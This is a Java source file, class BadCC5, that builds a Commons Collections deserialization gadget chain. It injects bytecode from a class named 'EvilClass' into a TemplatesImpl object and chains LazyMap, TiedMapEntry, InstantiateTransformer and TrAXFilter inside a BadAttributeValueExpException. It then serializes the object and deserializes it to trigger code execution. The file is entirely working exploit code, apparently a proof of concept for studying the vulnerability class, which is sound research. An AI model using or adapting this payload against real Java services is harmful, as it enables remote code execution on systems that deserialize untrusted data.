import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ObjectInputStream;
import java.util.HashMap;
import java.util.Map;

public class BadCC5 {
    public static void main(String[] args) throws Exception{
        byte[][] bytes = Util.getExpClassFileBytes("EvilClass");
        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes", bytes);
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        InstantiateTransformer fakeInstantiateTransformer = new InstantiateTransformer(new Class[]{}, new Object[]{});
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeInstantiateTransformer);

        TiedMapEntry entry = new TiedMapEntry(outerMap, String.class);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);

        Util.setValue(outerMap, "factory", instantiateTransformer);
        Util.setValue(entry, "key", TrAXFilter.class);

        Util.setValue(bad, "val", entry);

        Util.toSerialStr(bad);

        byte[] serial = Util.toSerial(bad);
        ObjectInputStream in = Util.fromSerial(serial);
        in.readObject();

    }
}
